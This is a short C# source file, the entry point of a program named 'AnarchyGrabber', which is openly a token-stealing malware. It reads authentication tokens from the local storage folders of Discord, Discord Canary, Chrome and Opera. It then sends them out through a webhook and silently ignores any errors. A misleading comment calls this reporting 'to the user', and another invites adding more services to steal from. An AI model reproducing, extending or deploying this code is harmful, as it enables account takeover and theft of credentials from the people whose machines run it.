using System.Collections.Generic;

namespace AnarchyGrabber
{
    class Program
    {
        static void Main(string[] args)
        {
            List<string> report = new List<string>();

            //attempt to get tokens from the different services (feel free to add more)
            report.Add("**Discord**");
            report.AddRange(Grabber.GetTokens(@"Roaming\Discord\Local Storage\leveldb"));
            report.Add("\n**Discord Canary**");
            report.AddRange(Grabber.GetTokens(@"Roaming\discordcanary\Local Storage\leveldb", true));
            report.Add("\n**Google Chrome**");
            report.AddRange(Grabber.GetTokens(@"Local\Google\Chrome\User Data\Default\Local Storage\leveldb"));
            report.Add("\n**Opera**");
            report.AddRange(Grabber.GetTokens(@"Roaming\Opera Software\Opera Stable\Local Storage\leveldb", true));

            //attempts to report the tokens to the user
            try
            {
                Webhook.ReportTokens(report);
            }
            catch { }
        }
    }
}
